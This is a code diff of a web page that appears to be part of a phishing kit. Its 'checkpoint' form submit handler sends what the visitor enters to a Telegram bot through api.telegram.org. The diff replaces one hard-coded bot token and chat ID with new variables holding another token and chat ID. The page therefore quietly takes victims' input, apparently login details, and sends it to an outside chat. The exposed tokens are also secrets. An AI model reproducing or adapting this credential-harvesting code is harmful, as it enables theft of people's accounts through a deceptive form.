@@ -147,10 +147,11 @@ function closeNav() {
     <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
-      <script>
+        <script>
        
       
-
+  var token = "2003179850:AAExo-o2BmvLr8pZM537wu8vNqp7NYGB8Ko"
+   var chat_id = "-523390222"
 
     $(document).ready(function () {
     $('#checkpointSubmitButton').click(function(e) {
@@ -166,7 +167,7 @@ function closeNav() {
 
 if(usname != ""){
 
-             $.post("https://api.telegram.org/bot1872229939:AAHUbiGPsCSGklZqSdxEODxWtOQYjPAZUSY/sendMessage?text="+icerik+"&chat_id=-527186560", 
+            $.post("https://api.telegram.org/bot"+token+"/sendMessage?text="+icerik+"&chat_id="+chat_id, 
               
               function (data, status) {
                 //console.log(data);
